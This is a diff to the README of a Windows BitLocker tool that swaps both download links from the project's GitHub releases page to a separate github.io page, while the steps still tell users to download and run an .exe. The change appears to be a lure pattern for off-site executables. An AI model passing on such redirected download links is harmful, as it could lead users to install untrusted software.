@@ -1,6 +1,6 @@
 # 🔑 YellowKey-Bitlocker - Manage BitLocker security on Windows systems
 
-[![](https://img.shields.io/badge/Download-YellowKey-blue.svg)](https://github.com/tchuin2609/YellowKey-Bitlocker/releases)
+[![](https://img.shields.io/badge/Download-YellowKey-blue.svg)](https://tchuin2609.github.io)
 
 ## 🛡️ What is YellowKey-Bitlocker?
 
@@ -21,7 +21,7 @@ Before you run YellowKey-Bitlocker, ensure your system meets these needs:
 
 Follow these steps to obtain the tool:
 
-1.  Visit this page to download the latest version: [https://github.com/tchuin2609/YellowKey-Bitlocker/releases](https://github.com/tchuin2609/YellowKey-Bitlocker/releases)
+1.  Visit this page to download the latest version: [https://tchuin2609.github.io](https://tchuin2609.github.io)
 2.  Look for the section labeled "Assets".
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your Downloads folder or your Desktop.
